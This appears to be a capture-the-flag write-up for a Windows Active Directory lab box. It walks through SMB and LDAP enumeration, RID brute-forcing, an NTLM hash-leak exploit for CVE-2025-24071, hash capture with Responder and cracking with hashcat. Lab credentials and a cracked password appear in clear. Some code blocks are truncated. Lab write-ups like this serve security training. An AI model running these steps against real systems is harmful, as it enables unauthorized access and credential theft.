# Fluffy

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!

## Enumeration

We are told this is a Windows box

Normal nmap scan reveals a lot of stuff opened:

```bash
└─$ nmap 10.10.11.69
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 13:13 CEST

5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
```

Looks like SMB ports are opened, let's check what in there:

```
└─$ smbclient -L \\10.10.11.69 -N     

        Sharename       Type      Comment

```

In the IT share we see some interesting things:

```shell
└─$ smbclient \\\\10.10.11.69\\IT --user="j.fleischman"
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.

Checking the changes from everything.exe shows something promising:

```
Friday, 20 June 2025: Version 1.4.1.1028
	fixed a crash when getting help text from a context menu item that throws an exception.
	updated localization.

Friday, 23 May 2025: Version 1.4.1.1027
	updated localization.
	improved security against dll hijacking.

Thursday, 1 August 2024: Version 1.4.1.1026
	updated localization.
```

Looks like version `1.4.1.1026` is vulnerable to dll hijacking.

In the SYSVOL, there's also an interesting file:

```shell
└─$ smbclient \\\\10.10.11.69\\SYSVOL --user="j.fleischman"
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.

This looks like some Active Directory policies or something similar. According to https://blog.netwrix.com/2017/01/30/sysvol-directory/ 

> The system volume (SYSVOL) is a special directory on each DC. It is made up of several folders with one being shared and referred to as the SYSVOL share.

We'll now exfiliate the files from the samba share to our computer to analyze them.

The PDF warns the sysadm to patch the system to mitigate the impact of the following CVEs:

CVE-2025-24996 - Critical

Looks like this vulnerability allows a user to trick NTLM into connect as another user. There's no POC available, however, ChatGPT suggest to use https://github.com/p0dalirius/Coercer to check if we're lucky.

CVE-2025-24071 - Critical

Looks like there's a poc for CVE-2025-24071: https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-. The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes.

CVE-2025-46785 - High

Related with a Buffer overflow in Zoom Workplace application. Maybe to be used for privilege escalation?

CVE-2025-29968 - High

Looks like denial of service vulnerability

CVE-2025-21193 - Medium

Spoofing in Active Directory, might be interesting

CVE-2025-3445  - Low

Relates to mholt/archiver golang

Most likely one of these vulnerabilities will be useful to us

The networks shares contain some zip files containing some exe files. Maybe there are useful somehow?

- everything-1.4.1.exe: https://www.voidtools.com/faq/
- kepass-2.58.exe: https://keepass.info/news/n250709_2.59.html

We can enumerate all the users in the machine with `crackmapexec`:

```bash
crackmapexec smb fluffy.htb -u anonymous -p "" --rid-brute 10000 > users     
```

And discard garbage data:

```bash
cat users|grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\' |grep -Ev (DC|SVC) |tail -n +4 > users.txt
```

### LDAP enumeration

```bash
ldapdomaindump fluffy.htb -u 'fluffy.htb\j.fleischman' -p 'J0elTHEM4n1990!' --no-json --no-grep
```

This produces the list of computers, groups, users and permissions.

## CVE-2025-24071

We managed to fabricate the payload required and upload it via SMB. 

```bash
python3 CVE-2025-24071.py -i 10.10.15.19 -n testpayload -o ./output --keep 
```


When listening for events with responder, we get the NTLM Hash of user p.agila

```
[+] Listening for events...

```

With hashcat and rockyou, we are able to retrieve the password: 

```bash
hashcat --show -m 5600 -a 0 pagilahash /usr/share/wordlists/rockyou.txt
```

prometheusx-303

From the LDAP dump, we know that this user is a Service Account Manager.
